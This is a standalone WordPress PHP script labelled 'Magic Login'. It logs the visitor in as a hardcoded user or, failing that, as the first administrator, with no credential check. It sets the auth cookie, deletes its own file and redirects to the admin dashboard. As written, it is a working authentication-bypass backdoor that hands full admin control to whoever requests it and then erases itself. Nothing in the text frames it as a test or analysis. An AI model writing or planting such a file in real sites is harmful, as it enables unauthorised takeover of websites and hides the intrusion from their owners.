<?php
require_once( 'wp-load.php' );

$username = 'guyucisayo8788';

if ( !($user_to_login = get_user_by( 'login', $username )) ) {
	if ( !( $user_to_login = get_user_by( 'email', $username )) ) {
	   $admin_users   = get_users( array( 'role' => 'administrator' ) );
       $user_to_login = is_array( $admin_users ) && isset( $admin_users[0] ) ? $admin_users[0] : false;
    }
}

if ( $user_to_login instanceof WP_User ) {
	wp_set_current_user( $user_to_login->ID, $user_to_login->user_login );
	wp_set_auth_cookie( $user_to_login->ID );
	do_action( 'wp_login', $user_to_login->user_login, $user_to_login );
} else {
    echo "Magic Login Failed,  not found";exit;
}

unlink( __FILE__ );
wp_redirect( admin_url() );


?>
